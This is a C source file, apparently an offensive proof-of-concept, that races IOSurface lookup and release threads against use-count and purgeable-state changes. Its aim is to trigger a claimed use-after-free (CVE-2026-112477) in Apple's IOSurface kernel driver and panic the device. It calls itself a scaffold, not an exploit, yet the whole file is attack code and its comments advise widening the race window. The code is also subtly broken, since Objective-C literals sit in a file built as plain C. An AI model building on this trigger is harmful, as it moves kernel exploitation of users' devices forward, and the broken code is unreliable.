/*
 * iosurface_race_scaffold.c — SCAFFOLD, not an exploit.
 *
 * Target : CVE-2026-112477 (com.apple.iokit.IOSurface)
 * Theory : a lookup path obtains an IOSurface reference without holding the
 *          lock that guards the table, then retains after the window where a
 *          concurrent release can free the object. The fix (text +0x18 only)
 *          extends a lock across the retain.
 * Status : behavioural race test; needs no offsets.
 *
 * Build  : xcrun -sdk iphoneos clang -arch arm64 \
 *              -framework IOSurface -framework CoreFoundation \
 *              iosurface_race_scaffold.c -o iosurf_race
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdatomic.h>
#include <pthread.h>
#include <unistd.h>
#include <IOSurface/IOSurface.h>

static atomic_int g_stop = 0;
static IOSurfaceRef g_surface = NULL;
static mach_port_t  g_port    = MACH_PORT_NULL;

/* Thread A: the lookup -> use -> release loop. The vulnerable window is
 * between the driver resolving the surface for a look-up and the point at
 * which the object is retained for the duration of the call. Calling
 * into the surface after releasing our own reference maximises it. */
static void *lookup_thread(void *arg) {
    (void)arg;
    while (!atomic_load(&g_stop)) {
        /* Take a new reference each round. */
        IOSurfaceRef s = IOSurfaceLookupFromMachPort(g_port);
        if (!s) continue;

        /* Use the surface, then drop our reference. The driver is expected
         * to keep the object alive across the internal call; pre-fix it may
         * not, and the next use is a UAF. */
        IOSurfaceLock(s, 0, NULL);
        volatile uint32_t h = IOSurfaceGetHeight(s);
        (void)h;
        IOSurfaceUnlock(s, 0, NULL);

        CFRelease(s);
    }
    return NULL;
}

/* Thread B: aggressively drive the surface's lifetime and mapping state so
 * that the "last reference" is dropped inside thread A's window. */
static void *teardown_thread(void *arg) {
    (void)arg;
    while (!atomic_load(&g_stop)) {
        if (g_surface) {
            /* Force the purgeable/in-use bookkeeping and re-map the memory
             * entry; these paths share the surface lock. */
            IOSurfaceIncrementUseCount(g_surface);
            IOSurfaceSetPurgeable(g_surface, kIOSurfacePurgeableEmpty, NULL);
            IOSurfaceSetPurgeable(g_surface, kIOSurfacePurgeableNonVolatile, NULL);
            IOSurfaceDecrementUseCount(g_surface);
        }
        sched_yield();
    }
    return NULL;
}

int main(void) {
    /* Create a shareable surface and publish a mach port for it. */
    NSDictionary *props = @{
        (id)kIOSurfaceWidth:  @4096,
        (id)kIOSurfaceHeight: @4096,
        (id)kIOSurfaceBytesPerElement: @4,
        (id)kIOSurfacePixelFormat: @('BGRA'),
    };
    g_surface = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (!g_surface) {
        fprintf(stderr, "[-] IOSurfaceCreate failed\n");
        return 1;
    }
    g_port = IOSurfaceCreateMachPort(g_surface);
    if (g_port == MACH_PORT_NULL) {
        fprintf(stderr, "[-] IOSurfaceCreateMachPort failed\n");
        return 1;
    }

    pthread_t a, b;
    pthread_create(&a, NULL, lookup_thread, NULL);
    pthread_create(&b, NULL, teardown_thread, NULL);

    /* Run for a while; a panic on 27.0.1 in IOSurface is the signal. */
    sleep(30);

    atomic_store(&g_stop, 1);
    pthread_join(a, NULL);
    pthread_join(b, NULL);

    mach_port_deallocate(mach_task_self(), g_port);
    CFRelease(g_surface);
    printf("[*] finished without a fault; widen the race window or retry\n");
    return 0;
}
